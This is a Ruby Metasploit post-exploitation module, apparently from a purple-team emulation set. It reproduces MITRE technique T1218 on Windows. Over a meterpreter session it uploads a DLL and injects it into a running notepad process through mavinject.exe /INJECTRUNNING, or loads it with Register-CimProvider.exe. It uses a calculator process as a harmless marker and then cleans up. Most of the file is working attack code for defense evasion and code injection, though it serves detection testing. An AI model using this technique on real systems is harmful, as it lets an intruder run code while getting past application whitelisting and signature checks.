##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Signed Binary Proxy Execution (T1218)',
        'Description'   => %q{
          Defense Evasion, Execution:
          Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.
          Mavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. [1]

          "C:\Program Files\Common Files\microsoft shared\ClickToRun\MavInject32.exe" /INJECTRUNNING C:\Windows\system32\mavinject.exe /INJECTRUNNING

          SyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe. [2]

          Several others binaries exist that may be used to perform similar behavior. [3] This module gives another option for dll injection via Register-CimProvider.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('METHOD', [true, 'Method of execution. 1=MAVINJECT, 2=Register-CimProvider.', '1'] ),
        OptBool.new('CLEANUP', [false, 'Delete files after execution and kill the calc process', true])
      ])
  end

  def kill_calc_notepad(finish=false)
    found_calc = false
    all_processes = client.sys.process.get_processes
    all_processes.each do |process|
      if process['name'] =~ /[Cc]alc/
        print_good('Found an instance of Calculator running. Killing it.')
        client.sys.process.kill(process['pid'])
        found_calc = true
      end
      if process['name'] =~ /[Nn]otepad/
        print_good('Found an instance of Notepad running. Killing it.')
        client.sys.process.kill(process['pid'])
      end
    end
    if finish and not found_calc
      print_warning('Calc not found. T1218 execution may have failed.')
      if datastore['METHOD'] == 1
        print_warning("Check if the file c:\\t1218.txt exists.")
      end
    end
  end


  def run()
    begin
      raise 'Module requires meterpreter session' unless session.type == 'meterpreter'

      # upload file
      local_file_path = ::Msf::Config.data_directory + '/purple/t1218/t1218_' + (client.arch == ARCH_X86 ? 'x86.dll' : 'x64.dll')
      remote_file_path = 'c:\\t1218.dll'
      print_status("Uploading #{local_file_path} to #{remote_file_path}")
      upload_file(remote_file_path, local_file_path)
      print_status("Killing currently running notepad and calc.")
      kill_calc_notepad

      # run it
      if datastore['METHOD'] == '1'
        pid = cmd_exec_get_pid("notepad.exe")
        cmd = "mavinject.exe #{pid.to_s} /INJECTRUNNING #{remote_file_path}"
        run_cmd(cmd)
      elsif datastore['METHOD'] == '2'
        cmd = "Register-CimProvider.exe -Path #{remote_file_path}"
        print_warning("You may get errors that 'Namespace' or 'ProviderName' is not specified or looking for the MI_Main function. There are normal and it does not mean that execution failed.")
        run_cmd(cmd)
      else
        raise 'Invalid execution method option.'
      end

      # check for running calc
      print_status("Sleeping 2 seconds, then checking for calc...")
      sleep(2)
      kill_calc_notepad(true)
      print_status("Check c:\\t1218.txt for additional output")

      if datastore['CLEANUP']
        register_files_for_cleanup(remote_file_path)
      end

      print_good("Module T1218W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1218W execution failed.")
    end
  end
end
